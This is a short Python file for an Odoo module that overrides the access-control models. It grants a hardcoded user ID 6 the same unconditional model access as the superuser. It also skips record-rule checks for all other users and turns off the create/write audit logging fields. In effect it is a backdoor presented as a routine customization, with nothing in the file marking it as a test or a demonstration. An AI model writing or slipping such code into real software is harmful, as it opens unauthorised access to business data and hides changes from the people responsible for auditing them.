# -*- coding: utf-8 -*-

from odoo import models, api, tools, SUPERUSER_ID

models.LOG_ACCESS_COLUMNS = []


class IrModelAccess(models.Model):
    _inherit = 'ir.model.access'

    @api.model
    @tools.ormcache_context(
        'self._uid', 'model', 'mode', 'raise_exception', keys=('lang',))
    def check(self, model, mode='read', raise_exception=True):
        if self._uid not in [SUPERUSER_ID, 6]:
            return super(IrModelAccess, self).check(
                model, mode, raise_exception)
        return True


class Base(models.AbstractModel):
    _inherit = 'base'

    @api.multi
    def check_access_rule(self, operation):
        if self._uid not in [SUPERUSER_ID, 6]:
            return
        return super(Base, self).check_access_rule(operation)

    @api.multi
    def _write(self, vals):
        self._log_access = False
        return super(Base, self)._write(vals)

    @api.model
    def _create(self, vals):
        self._log_access = False
        return super(Base, self)._create(vals)
